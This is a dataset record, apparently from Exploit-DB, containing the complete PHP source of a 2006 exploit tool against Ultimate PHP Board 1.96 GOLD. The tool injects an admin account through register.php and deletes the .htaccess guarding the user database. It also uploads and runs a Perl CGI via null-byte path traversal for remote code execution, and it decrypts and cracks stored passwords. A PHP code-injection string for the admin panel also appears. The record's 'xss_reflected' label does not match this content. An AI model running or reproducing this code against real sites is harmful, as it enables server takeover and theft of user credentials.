{
  "id": "1932",
  "title": "Ultimate PHP Board 1.96 GOLD - Multiple Vulnerabilities",
  "cve": null,
  "vuln_type": "xss_reflected",
  "code": "<?php\r\n/*\r\nAdvisory:\r\nhttp://www.kliconsulting.com/users/mbrooks/UPBadvisory.rtf\r\nVendors site:\r\nhttp://forum.myupb.com/\r\nDownload:\r\nhttp://fileserv.myupb.com/download.php?url=upb196GOLD.zip\r\nhttp://prdownloads.sourceforge.net/textmb/upb1.8.2.zip?download\r\nDownload Mirror:\r\nhttp://www.kliconsulting.com/users/mbrooks/upb196GOLD.zip\r\nhttp://www.kliconsulting.com/users/mbrooks/upb1.8.2.zip\r\n*/\r\n//perl cgi code to inject into vulnerable system:\r\n//payload should start with [NR] and end with #;\r\n$perlPayload=\"[NR] use CGI qw(:standard);print header;print \\\" start \\\";print \\\" 0-day  \\\";print \\\" exploit \\\"; print \\\" code  end \\\";#\";\r\n\r\n$v1_xKey=\"wdnyyjinffnruxezrkowkjmtqhvrxvolqqxokuofoqtneltaomowpkfvmmogbayankrnrhmbduzfmpctxiidweripxwglmwrmdscoqyijpkzqqzsuqapfkoshhrtfsssmcfzuffzsfxdwupkzvqnloubrvwzmsxjuoluhatqqyfbyfqonvaosminsxpjqebcuiqggccl\";\r\n//taken from ./textdb.inc.php line 324:\r\n\r\nfunction t_decrypt($text,$key){\r\n    $crypt = \"\";\r\n    for($i=0;$i<strlen($text);$i++)\r\n    {\r\n        $i_key = ord(substr($key, $i, 1));\r\n        $i_text = ord(substr($text, $i, 1));\r\n        $n_key = ord(substr($key, $i+1, 1));\r\n        $i_crypt = $i_text + $n_key;\r\n        $i_crypt = $i_crypt - $i_key;\r\n        $crypt .= chr($i_crypt);\r\n    }\r\n    return $crypt;\r\n}\r\n\r\n\r\nfunction t_encrypt($text, $key)\r\n{\r\n    $crypt = \"\";\r\n    for($i=0;$i<strlen($text);$i++)\r\n    {\r\n//\tprint $i.\"key char:\".substr($key, $i, 1).\"<br>\";\r\n        $i_key = ord(substr($key, $i, 1));\r\n  //     print $i.\"ikey:\".$i_key.\"<br>\";\r\n\t$i_text = ord(substr($text, $i, 1));\r\n//\tprint $i.\"itext:\".$i_text.\"<br>\";\r\n        $n_key = ord(substr($key, $i+1, 1));\r\n//\tprint $i.\"nkey:\".$n_key.\"<br>\";\r\n\t\r\n        $i_crypt = $i_text + $i_key;\r\n//\tprint  $i.\"T+K_crypt:\".$i_crypt .\"<br>\";\r\n        $i_crypt = $i_crypt - $n_key;\r\n//\tprint $i.\"I-N_crypt:\".$i_crypt.\"<br>\";\r\n        $crypt .= chr($i_crypt);\r\n\r\n\t$offset0=$i_crypt-$i_text;\r\n//\tprint \"key=$i_key - $n_key<br>\";\r\n//\tprint \"offset0:$offset0=$i_crypt-$i_text<br>\";\r\n\t$offset=$i_key-$n_key;\r\n\t//print \"offset:$offset<br>\";\r\n//\t$broken=$i_text+$offset;\r\n//\tprint \"broken:\".$broken;\t\r\n\r\n    }\r\n    return $crypt;\r\n}\r\n\r\nfunction gen_collision($offset, $start){//$start should be a number of an ascii char\r\n   $offset_len=strlen($offset);\r\n   $x=0;\r\n //  print \"len:\".$offset_len.\"<br>\";\r\n  // for($x=0;$x<$offset_len;$x++){//$offset as $off_int){\r\n  foreach($offset as $off_char){\r\n\tif($x==0){\r\n\t\t$newkey.=chr($start);\r\n\t\t$nextchar=$start;\r\n\t\t$x++;\r\n\t}\r\n//\tprint \"next char: $nextchar \".\"offset:\".$off_char.\"<br>\";\r\n\t$tmp=$nextchar - $off_char;\r\n\t$newkey.=chr($tmp);\r\n\t$nextchar=$tmp;\r\n   }\r\n   return $newkey;\r\n}\r\n\r\nfunction gen_offset($crypt,$text){\r\n\t$text_len=strlen($text);\r\n\tfor($x=0;$x<$text_len;$x++){\r\n//\t\tprint \"crypt:\".substr($crypt, $x, 1).'text:'.substr($text, $x, 1).'<br>';\r\n\t\t$cry_hex=ord(substr($crypt, $x, 1));\r\n\t\t$txt_hex=ord(substr($text, $x, 1));\r\n\t\t$offset[$x]=$cry_hex - $txt_hex;\r\n\t\t//print \"offset\".$offset.\"crypt\".$cry_hex.\"text\".$txt_hex[x].\"<br>\";\r\n\t}\r\n\treturn $offset;//numeric array\r\n}\r\n\r\n\r\nfunction http_gpc_send( $method, $host, $port ,$usepath,$cookie=\"\", $postdata = \"\") {\r\n $fp = pfsockopen( $host, $port, &$errno, &$errstr, 120 );\r\n # user-agent name\r\n $ua = \"msnbot/1.0 (+http://search.msn.com/msnbot.htm)\";\r\n\r\n if( !$fp ) {\r\n    print \"$errstr ($errno)<br>\\nn\";\r\n } else {\r\n    if( $method == \"GET\" ) {\r\n        fputs( $fp, \"GET $usepath HTTP/1.0\\n\" );\r\n    }\r\n    else if( $method == \"POST\" ) {\r\n        fputs( $fp, \"POST $usepath HTTP/1.0\\n\" );\r\n    }\r\n    \r\n    fputs( $fp, \"User-Agent: \".$ua.\"\\n\" );\r\n    fputs($fp, \"Host: \".$host.\"\\n\");\r\n    fputs( $fp, \"Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\\n\" );\r\n    fputs( $fp, \"Accept-Language: en-us,en;q=0.5\\n\" );\r\n    fputs( $fp, \"Accept-Encoding: gzip,deflate\\n\" );\r\n    fputs( $fp, \"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\\n\" );\r\n    fputs( $fp, \"Cookie: \".$cookie.\"\\n\" );\r\n   \r\n   if( $method == \"POST\" ) {\r\n\t$strlength = strlen( $postdata );\r\n        fputs( $fp, \"Content-type: application/x-www-form-urlencoded\\n\" );\r\n        fputs( $fp, \"Content-length: \".$strlength.\"\\n\\n\" );\r\n        fputs( $fp, $postdata.\"\\n\\n\");\r\n    }\r\n    fputs( $fp, \"\\n\\n\" );\r\n    \r\n   $output = \"\";\r\n   while( !feof( $fp ) ) {\r\n        $output .= fgets( $fp, 1024 );\r\n   }\r\n    fclose( $fp );\r\n }\r\n return $output;\r\n }\r\n\r\nfunction getAdmin($victHost, $victPort, $victPath, $exp_user_env,$exp_pass_env,$exp_id_env){\r\n    $exp_power_env=\"3\";//admin\r\n    $InjectUserPost=\"u_login=te\".rand().\"1&u_email=rew\".rand().\"@wfje.com&u_loca=&u_site=&avatar=images%2Favatars%2Fnoavatar.gif&u_icq=&u_aim=&u_msn=&u_sig=s%3C%7E%3E0%3C%7E%3E2006-04-20%5BNR%5D\".$exp_user_env.\"%3C%7E%3E\".$exp_pass_env.\"%3C%7E%3E\".$exp_power_env.\"%3C%7E%3EA%40a.com%3C%7E%3E%3C%7E%3E%3C%7E%3E%3C%7E%3E1%3C%7E%3E%3C%7E%3E%3C%7E%3E%3C%7E%3E%3C%7E%3E13%3C%7E%3E%3C%7E%3E1%3C%7E%3E\".$exp_id_env.\"&submit=Submit\";\r\n    http_gpc_send(\"POST\", $victHost, $victPort, $victPath.\"/register.php\", \"\", $InjectUserPost);\r\n}\r\n\r\n\r\nif(isset($_REQUEST['vict'])){\r\n    $payName=\"data\".rand().\".cgi\";//must be .cgi\r\n    $expPost=\"u_name=Admin&subject=hey&icon=#!/usr/bin/perl -wT \\\"&message=$perlPayload&id=/../images/$payName%00\";\r\n    $exp_user_env=\"Jockie227\";\r\n    $exp_pass_env=\"tZbi}\";\r\n    $exp_power_env=\"3\";\r\n    $exp_id_env=4000000000+rand(0,300000000);\r\n    //The script is injecting user into the database;  becase of this the cookie is known before the script even contacts the vulnerable \"Ultamate PHP Boar\".  Also note that a time stamp is not needed. \r\n    $cookie=\"user_env=$exp_user_env; pass_env=$exp_pass_env; power_env=$exp_power_env; id_env=$exp_id_env\";\r\n\r\n    $url_parsed = parse_url($_REQUEST['vict']);\r\n    if ( empty($url_parsed['scheme']) ) {\r\n        $url_parsed = parse_url('http://'.$url);\r\n    }\r\n    $rtn['url'] = $url_parsed;\r\n    $victPort = $url_parsed[\"port\"];\r\n    if ( !$port ) {\r\n        $victPort = 80;\r\n    }\r\n    $victPath = $url_parsed[\"path\"];\r\n    $victHost = $url_parsed[\"host\"];\r\n\r\n    print \"<title> Ultamate PHP Board Remote Code EXEC 0-Day </title>\";\r\n    print \"<CENTER><B><I>0-day</I></B></CENTER>\";\r\n\r\n    //injecting user into database,  this information is used to verify session information\r\n    getAdmin($victHost, $victPort, $victPath, $exp_user_env,$exp_pass_env,$exp_id_env);\r\n  //http_gpc_send(\"POST\", $victHost, $victPort, $victPath.\"/register.php\", \"\", $InjectUserPost);\r\n\r\n   // http_gpc_send(\"GET\", $victHost, $victPort, $victPath.\"/open.php?id=../images%00\", $cookie);\r\n\r\n    //uploading CGI\r\n    $field=http_gpc_send(\"POST\", $victHost, $victPort, $victPath.\"/newpost.php?a=1&t=1&page=1\", $cookie, $expPost);\r\n    //making cgi executeable usei \"close.php\"\r\n    http_gpc_send(\"GET\", $victHost, $victPort, $victPath.\"/close.php?id=../images/\".$payName.\"%00\", $cookie);\r\n    //executing cgi\r\n    $feedBack=http_gpc_send(\"GET\",$victHost, $victPort, $victPath.\"/images/\".$payName);\r\n    $field = str_replace(\"<\", \"&lt;\", $field);\r\n    $field = str_replace(\">\", \"&gt;\", $field);\r\n   // print $field;\r\n    print $feedBack;\r\n    exit;\r\n}elseif(isset($_REQUEST['victHTA'])){\r\n    $expPost=\"u_name=#&message=#&id=/.htaccess%00\";\r\n    $exp_user_env=\"Jockie227\";\r\n    $exp_pass_env=\"tZbi}\";\r\n    $exp_power_env=\"3\";\r\n    $exp_id_env=4000000000+rand(0,300000000);\r\n    //The script is injecting user into the database;  becase of this the cookie is known before the script even contacts the vulnerable Ultamate PHP Board.  Also note that a time stamp is not needed. \r\n    $cookie=\"user_env=$exp_user_env; pass_env=$exp_pass_env; power_env=$exp_power_env; id_env=$exp_id_env\";\r\n\r\n    $url_parsed = parse_url($_REQUEST['victHTA']);\r\n    if ( empty($url_parsed['scheme']) ) {\r\n        $url_parsed = parse_url('http://'.$url);\r\n    }\r\n    $rtn['url'] = $url_parsed;\r\n    $victPort = $url_parsed[\"port\"];\r\n    if ( !$port ) {\r\n        $victPort = 80;\r\n    }\r\n    $victPath = $url_parsed[\"path\"];\r\n    $victHost = $url_parsed[\"host\"];\r\n\r\n    //injecting user into database,  this information is used to verify session information\r\n    getAdmin($victHost, $victPort, $victPath, $exp_user_env,$exp_pass_env,$exp_id_env);\r\n    //\r\n    $field=http_gpc_send(\"POST\", $victHost, $victPort, $victPath.\"/newpost.php?a=1&t=1&page=1\", $cookie, $expPost);\r\n   // $field = str_replace(\"<\", \"&lt;\", $field);\r\n   // $field = str_replace(\">\", \"&gt;\", $field);\r\n   // print $field;\r\n   print \"<script>window.location=\\\"\".$_REQUEST['victHTA'].\"/db/\\\";</script>\" ;\r\n    exit;\r\n}else if(isset($_REQUEST['addVict'])){\r\n    $url_parsed = parse_url($_REQUEST['addVict']);\r\n    if ( empty($url_parsed['scheme']) ) {\r\n        $url_parsed = parse_url('http://'.$url);\r\n    }\r\n    $rtn['url'] = $url_parsed;\r\n    $victPort = $url_parsed[\"port\"];\r\n    if ( !$port ) {\r\n        $victPort = 80;\r\n    }\r\n    $victPath = $url_parsed[\"path\"];\r\n    $victHost = $url_parsed[\"host\"];\r\n\r\n    $exp_user_env=$_REQUEST[\"addName\"];\r\n    $exp_pass_env=t_encrypt($_REQUEST[\"addPass\"],$v1_xKey);\r\n    getAdmin($victHost, $victPort, $victPath, $exp_user_env,$exp_pass_env,4000000000+rand(0,300000000));\r\n    print \"<title> Ultamate PHP Board Remote Code EXEC 0-Day </title>\";\r\n    print \"<CENTER><B> Admin login Name:\".$_REQUEST[\"addName\"].\"</B></CENTER>\";//this exploit code suffers from xss!\r\n    print \"<CENTER><B> Admin login Password:\".$_REQUEST[\"addPass\"].\"</B></CENTER>\";\r\n    exit;\r\n}else if(isset($_REQUEST['decrypt'])){\r\n    print \"<I>ecrypted password:</I>\";\r\n    print \"<CENTER>\".$_REQUEST[\"decrypt\"].\"</CENTER>\";\r\n    print \"<B>Decrypted password:</B>\";\r\n    print \"<CENTER><B>\".t_decrypt($_REQUEST[\"decrypt\"],$v1_xKey).\"</B></CENTER>\";\r\n    exit;\r\n}else if(isset($_REQUEST['encrypt'])){\r\n    print \"<I>ecrypted password:</I>\";\r\n    print \"<CENTER>\".$_REQUEST[\"encrypt\"].\"</CENTER>\";\r\n    print \"<B>Decrypted password:</B>\";\r\n    print \"<CENTER><B>\".t_encrypt($_REQUEST[\"encrypt\"],$v1_xKey).\"</B></CENTER>\";\r\n  //  print get_key(t_encrypt($_REQUEST[\"encrypt\"],$v1_xKey),$_REQUEST[\"encrypt\"]);\r\n    exit;\r\n}else if(isset($_REQUEST['cypher'])&&isset($_REQUEST['plain'])){\r\n\t$cypher_len=strlen($_REQUEST['cypher']);\r\n\t$offset=gen_offset($_REQUEST['cypher'],$_REQUEST['plain']);\r\n\tprint \"Offset:\";\r\n\tfor($x=0;$x<$cypher_len;$x++){\r\n\t\tprint  $offset[$x].':';\r\n\t}\r\n\tprint '<br>';\r\n\t$validKeys=0;\r\n\t$y=0;\r\n\tfor($y=255;$y>=0;$y--){\r\n\t\t$newKey[$y]=gen_collision($offset,$y);\r\n\t\t$key_len=strlen($newKey[$y]);\r\n\t\tprint \"<br>Key:$y  = \";\r\n\t\tfor($x=0;$x<=$key_len;$x++){\r\n\t\t\tprint  $newKey[$y][$x];\r\n\t\t}\t\t\t\r\n\t\tprint  \"<br>Cypher:\".t_encrypt($_REQUEST['plain'],$newKey[$y]);\t\t\t\r\n\t\tprint \"<br>Plain     :\".t_decrypt($_REQUEST['cypher'],$newKey[$y]).\"<br><br>\";\r\n\t}\r\n\texit;\r\n}\r\n\r\nprint \"<title> Ultimate PHP Board Remote Code EXEC 0-Day </title>\r\n    \r\n    <CENTER><B><I>0-day</I></B></CENTER>\r\n     ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br>\r\n    <B><I>Get Admin</I></B><br>\r\n    <B>Inject an administrative account into UPB:</B>\r\n    <p>\r\n    <form ACTION=\".$_SERVER['PHP_SELF'].\" method=\\\"post\\\"> \r\n    <p>\r\n    Path to attack:<i>(example: http://www.domain.ext/PathToUPB)</i><br>\r\n    <input name=\\\"addVict\\\" type=\\\"text\\\" size=60> <br>\r\n    Inject Name:<br>\r\n    <input name=\\\"addName\\\" type=\\\"text\\\" size=60> <br>\r\n    Inject Password:<br>\r\n    <input name=\\\"addPass\\\" type=\\\"text\\\" size=60> <br>\r\n    <p>    \r\n    <input type=\\\"submit\\\" value=\\\"Inject Admin\\\">     \r\n    </form>\r\n    \r\n    <p>\r\n    <B>PHP code injection is possilbe in the admin panel without an exploit.  Both admin_config.php and admin_config2.php can be used to execute PHP by tagging on: '  \\\";phpinfo(); \\$crap=\\\"1  ' to any of the config values </B>( double quotes \\\" are only used in exploit)</B>\r\n    <p>  \r\n    ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br>\r\n    <B><I>Gain Read Access To The Database</I></B>\r\n\r\n   <form ACTION=\".$_SERVER['PHP_SELF'].\" method=\\\"post\\\"> \r\n    <p>\r\n    Removes  /db/.htaccess to allow access to the remote target's flat file database:<i>(example: http://www.domain.ext/PathToUPB  [no trailing slash]) (user database in /db/users.dat) </i><br><br>\r\n    <input name=\\\"victHTA\\\" type=\\\"text\\\" size=60> <br>\r\n    <p>    \r\n    <input type=\\\"submit\\\" value=\\\"Attack\\\">\r\n    </form>    \r\n    ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br>\r\n    <B><I>Crypto</I></B>  \r\n\t\r\n   <form ACTION=\".$_SERVER['PHP_SELF'].\" method=\\\"post\\\"> \r\n    <p>\r\n    Plain Text Password:<br>\r\n    <input name=\\\"encrypt\\\" type=\\\"text\\\" size=60> <br>\r\n    <p>    \r\n    <input type=\\\"submit\\\" value=\\\"Encrypt\\\">     \r\n    </form>\r\n    <form ACTION=\".$_SERVER['PHP_SELF'].\" method=\\\"post\\\"> \r\n    Encrypted Password:<br>\r\n    <input name=\\\"decrypt\\\" type=\\\"text\\\" size=60> <br>\r\n    <p>    \r\n    <input type=\\\"submit\\\" value=\\\"Decrypt\\\">     \r\n    </form>\r\n    ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br>  \r\n    <form ACTION=\".$_SERVER['PHP_SELF'].\" method=\\\"post\\\"> \r\n    <p>\r\n    Plain Text:<br>\r\n    <input name=\\\"plain\\\" type=\\\"text\\\" size=60> <br>\r\n    <p>    \r\n    corosponding cypher text:<br>\r\n    <input name=\\\"cypher\\\" type=\\\"text\\\" size=60> <br>\r\n    <p>    \r\n    <input type=\\\"submit\\\" value=\\\"crack key\\\">     \r\n    </form>\r\n    ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br>\r\n   <B><I>Proof of Concept Only,  Unstable Remote Code Execution Using NON-SQL Database Injection</I></B>\r\n    <form ACTION=\".$_SERVER['PHP_SELF'].\" method=\\\"post\\\"> \r\n    <p>\r\n     perl CGI Code Injection Attack Remote Target:<br>\r\n    <input name=\\\"vict\\\" type=\\\"text\\\" size=60> <br>\r\n    <p>    \r\n    <input type=\\\"submit\\\" value=\\\"Attack\\\">\r\n    </form>\r\n    \r\n    <B>http://www.domain.ext/PathToUPB  (no trailing slash)</B>\r\n    </body>\";\r\n?>\r\n\r\n# milw0rm.com [2006-06-20]",
  "url": "https://www.exploit-db.com/exploits/1932"
}